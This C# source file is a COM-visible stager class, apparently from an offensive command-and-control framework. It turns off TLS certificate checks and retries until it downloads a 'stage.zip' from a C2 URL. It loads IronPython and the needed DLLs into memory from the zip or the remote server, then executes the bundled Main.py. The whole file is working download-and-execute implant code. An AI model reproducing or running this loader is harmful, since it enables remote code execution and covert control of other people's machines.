using System;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using IronPython.Hosting;
using System.Runtime.InteropServices;
//using System.Net.WebSockets;
//using IronPython.Runtime.Operations;

[ComVisible(true)]
public class ST
{
    static ST()
    {
        ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
    }
    static Byte[] Download(Uri URL)
    {
        while (true)
        {
            try
            {
                using (var wc = new WebClient())
                {
                    var responseBody = wc.DownloadData(URL);
#if DEBUG
                    Console.WriteLine("Downloaded {0} bytes", responseBody.Length);
#endif
                    return responseBody;
                }
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Error downloading {0}: {1}", URL, e.Message);
#endif
                Thread.Sleep(5000);
            }
        }
    }
    static Byte[] Fetch(Uri URL, string Channel)
    {
        switch (Channel)
        {
            case "http":
                return Download(URL);
            default:
                return new Byte[0];
        }
    }
    public static Byte[] GetResourceInZip(ZipArchive zip, string resourceName)
    {
        foreach (var entry in zip.Entries)
        {
            if (entry.Name == resourceName)
            {
#if DEBUG
                Console.WriteLine("Found {0} in initial stage", resourceName);
#endif
                using (var resource = entry.Open())
                {
                    var resdata = new Byte[entry.Length];
                    resource.Read(resdata, 0, resdata.Length);
                    return resdata;
                }
            }
        }
        return new Byte[0];
    }
    static ZipArchive Stage(Uri URL, string Channel)
    {
        while (true)
        {
            try
            {
                var memoryStream = new MemoryStream();
                var StageURL = new Uri(URL, "stage.zip");
                var data = Fetch(StageURL, Channel);
                memoryStream.Write(data, 0, data.Length);
                return new ZipArchive(memoryStream, ZipArchiveMode.Read);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Error downloading stage: {0}", e.Message);
#endif
                Thread.Sleep(5000);
            }
        }
    }
    public static void CreateRuntime(Uri URL, string Channel, ZipArchive stage)
    {
        var engine = Python.CreateEngine();
        var scope = engine.CreateScope();
        scope.SetVariable("URL", URL.ToString());
        scope.SetVariable("CHANNEL", Channel);
        scope.SetVariable("IronPythonDLL", Assembly.Load(GetResourceInZip(stage, "IronPython.dll")));
#if DEBUG
        scope.SetVariable("DEBUG", true);
#endif
        var mainfile = GetResourceInZip(stage, "Main.py");
        //result = PythonOps.InitializeModuleEx(Assembly.Load(GetResourceInZip(stage, "Main.dll")), "__main__", null, false, null);
        engine.Execute(System.Text.Encoding.UTF8.GetString(mainfile, 0, mainfile.Length), scope);
    }
    public void main(string Url, string C2Channel)
    {
        string[] SupportedChannels = { "http" };

        if (!(Array.IndexOf(SupportedChannels, C2Channel.ToLower()) >= 0))
        {
            return;
        }

        if (Url == "")
        {
            return;
        }

        string Channel = C2Channel;
        Uri URL = new Uri(Url);

#if DEBUG
        Console.WriteLine("URL: {0}", URL);
        Console.WriteLine("Channel: {0}", Channel);
        Console.WriteLine();
#endif
        var stage = Stage(URL, Channel);
        AppDomain.CurrentDomain.AssemblyResolve += (sender, resargs) =>
        {
            string name = resargs.Name.Substring(0, resargs.Name.IndexOf(','));
#if DEBUG
            Console.WriteLine("Trying to resolve {0}.dll", name);
#endif
            try
            {
                return Assembly.Load(GetResourceInZip(stage, name + ".dll"));
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("{0}.dll not found in initial stage: {1}", name, e.Message);
#endif
                return Assembly.Load(Fetch(new Uri(URL, name + ".dll"), Channel));
            }
        };

        try
        {
            CreateRuntime(URL, Channel, stage);
        }
        catch (Exception e)
        {
#if DEBUG
            Console.WriteLine("Error executing script in runtime: {0}", e.Message);
            Console.WriteLine(e.ToString());
#endif
        }
    }
}